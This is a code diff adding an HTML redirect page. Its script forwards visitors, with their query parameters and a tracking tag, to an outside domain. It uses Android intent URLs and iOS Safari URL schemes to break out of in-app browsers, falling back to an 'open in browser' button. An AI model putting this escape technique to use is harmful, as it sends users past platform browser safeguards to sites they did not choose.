@@ -1,0 +1,49 @@
+
+<!DOCTYPE html>
+<html>
+<head><meta name="viewport" content="width=device-width,initial-scale=1"></head>
+<body style="margin:0;background:#000;display:flex;flex-direction:column;align-items:center;justify-content:center;min-height:100vh;gap:20px;padding:20px">
+<script>
+(function(){
+  var DEST = 'https://be.mysommer.online/?source=Rgh89r';
+
+  var p = new URLSearchParams(window.location.search);
+  var qs = p.toString();
+  var base = DEST.replace(/\/+$/,'');
+  var finalUrl = base + '/' + (qs ? '?' + qs : '');
+
+  var isAndroid = /android/i.test(navigator.userAgent || '');
+  var host = finalUrl.replace('https://','').replace('http://','');
+
+  var booted = false;
+  document.addEventListener('visibilitychange', function(){ if (document.hidden) booted = true; });
+
+  function bootAndroid(){
+    window.location.href = 'intent://' + host + '#Intent;scheme=https;action=android.intent.action.VIEW;end';
+  }
+
+  function bootIOS(){
+    var tries = ['x-safari-' + finalUrl, 'com-apple-mobilesafari-tab:' + finalUrl];
+    var i = 0;
+    (function next(){
+      if (booted || i >= tries.length) return;
+      window.location.href = tries[i++];
+      setTimeout(next, 1200);
+    })();
+  }
+
+  function go(){ if (isAndroid) bootAndroid(); else bootIOS(); }
+
+  go();
+
+  setTimeout(function(){
+    document.body.innerHTML =
+      '<div style="background:rgba(0,200,83,.15);border-radius:20px;padding:20px;display:inline-flex"><svg width="64" height="64" viewBox="0 0 24 24" fill="none" stroke="#00C853" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"><path d="M18 13v6a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h6"/><polyline points="15 3 21 3 21 9"/><line x1="10" y1="14" x2="21" y2="3"/></svg></div>'
+      + '<p style="color:#fff;font-size:15px;font-family:system-ui;text-align:center;max-width:300px;line-height:1.5">For the best experience, tap the button to open in your browser</p>'
+      + '<button id="ob" style="display:inline-flex;align-items:center;gap:10px;background:#00C853;color:#fff;border:none;border-radius:8px;padding:18px 48px;font-size:18px;font-weight:600;font-family:system-ui;box-shadow:0 0 20px rgba(0,200,83,.4)"><svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M18 13v6a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h6"/><polyline points="15 3 21 3 21 9"/><line x1="10" y1="14" x2="21" y2="3"/></svg>Open in browser</button>';
+    document.getElementById('ob').addEventListener('click', go);
+  }, 500);
+})();
+</script>
+</body>
+</html>
